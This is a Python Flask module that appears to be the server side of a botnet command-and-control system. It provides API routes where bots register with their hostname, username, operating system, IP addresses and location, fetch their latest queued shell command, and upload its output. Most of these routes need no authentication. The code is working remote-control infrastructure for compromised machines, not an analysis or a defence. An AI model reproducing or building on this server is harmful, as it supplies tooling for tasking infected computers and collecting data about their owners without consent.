
# Standard library imports

from datetime import datetime as dt

# Third-party imports

from flask import ( abort,
                    Blueprint, 
                    request )

from flask_login import login_required

# Local application/library specific imports

from models.bot import Bot
from models.command import Command
from schemas.command import cmd_schema
from utils.database import database


bots = Blueprint("bots", __name__) 


# ================================================================== #
#                                                                    #
#                            Paths for bot                           #
#                                                                    #
# ================================================================== #


@bots.route("/api/bot", methods=["POST"])
def add_bot():

    success_code = 0

    # Get data in JSON Format

    requests_data = request.get_json()  

    # Check if bot exists

    bot_exists = database.session.query(Bot.uuid) \
        .filter_by(uuid=requests_data["uuid"]) \
        .first() is not None

    if bot_exists:

        return { "success": success_code }

    # Create bot, push and save changes

    bot = Bot(**requests_data)

    try: 
        
        database.session.add(bot)
        database.session.commit()

        success_code = 1

    except Exception:

        database.session.rollback()

    finally:

        return { "success": success_code }


@bots.route("/api/bot/<uuid>", methods=["PUT"])
def update_bot(uuid):

    success_code = 0

    # Check if bot exists

    bot = Bot.query.get(uuid)

    if not bot:

        return abort(404)

    # Get data in JSON Format

    requests_data = request.get_json()

    # Modify bot information

    bot.hostname = requests_data["hostname"]
    bot.username = requests_data["username"]
    bot.os = requests_data["os"]
    bot.remote_ip = requests_data["remote_ip"]
    bot.datetime = dt.now().strftime("%Y-%m-%d %H:%M:%S")
    bot.local_ip = requests_data["local_ip"]
    bot.state = requests_data["state"]
    bot.location = requests_data["location"]

    # Save changes

    try: 

        database.session.commit()

        success_code = 1

    except Exception:

        database.session.rollback()

    finally:

        return { "success": success_code }


@bots.route("/api/bot/<uuid>", methods=["DELETE"])
@login_required
def delete_bot(uuid):

    success_code = 0

    # Check if bot exists

    bot = Bot.query.get(uuid)

    if not bot:

        return abort(404)

    # Delete bot and save changes

    try: 

        database.session.delete(bot)

        database.session.commit()

        success_code = 1

    except Exception:

        database.session.rollback()

    finally:

        return { "success": success_code }


# ================================================================== #
#                                                                    #
#                     Paths for bot commands                         #
#                                                                    #
# ================================================================== #


@bots.route("/api/bot/<uuid>/command", methods=["GET"])
def get_command(uuid):

    # Check if bot exists

    bot = Bot.query.get(uuid)

    if not bot:

        return abort(404)

    # Get last command

    cmd = bot.commands.order_by(Command.timestamp.desc()).first()

    return cmd_schema.jsonify(cmd)


@bots.route("/api/bot/<uuid>/command", methods=["POST"])
def push_command(uuid):

    success_code = 0

    # Get data in JSON format

    requests_data = request.get_json()

    # Check if bot exists

    bot_exists = database.session.query(Bot.uuid) \
        .filter_by(uuid=uuid) \
        .first() is not None

    if not bot_exists:

        return abort(404)

    # Create command and push

    cmd = Command(bot_uuid=uuid, line=requests_data["line"], output=requests_data["output"])

    try: 

        database.session.add(cmd)
        database.session.commit()

        success_code = 1

    except Exception:

        database.session.rollback()

    finally:

        return { "success": success_code }


@bots.route("/api/bot/<uuid>/command", methods=["PUT"])
def update_output_from_command(uuid):

    success_code = 0

    # Check if bot exists

    bot = Bot.query.get(uuid)

    if not bot:

        return abort(404)

    # Get data in JSON format

    requests_data = request.get_json()  # { "output": "lalalalalalalal" } 

    # Get last command

    cmd = bot.commands.order_by(Command.timestamp.desc()).first()

    # Modify obtained command

    if requests_data.get("line"):

        cmd.line = requests_data["line"]
    
    if requests_data.get("output"):

        cmd.output = requests_data["output"]

    # Save Changes

    try: 

        database.session.commit()

        success_code = 1

    except Exception:

        database.session.rollback()

    finally:

        return { "success": success_code }


@bots.route("/api/bot/<uuid>/command", methods=["DELETE"])
def delete_command(uuid):

    success_code = 0

    # Check if bot exists

    bot = Bot.query.get(uuid)

    if not bot:

        return abort(404)

    # Get last command

    cmd = bot.commands.order_by(Command.timestamp.desc()).first()

    # Save Changes

    try: 

        database.session.delete(cmd)

        database.session.commit()

        success_code = 1

    except Exception:

        database.session.rollback()

    finally:

        return { "success": success_code }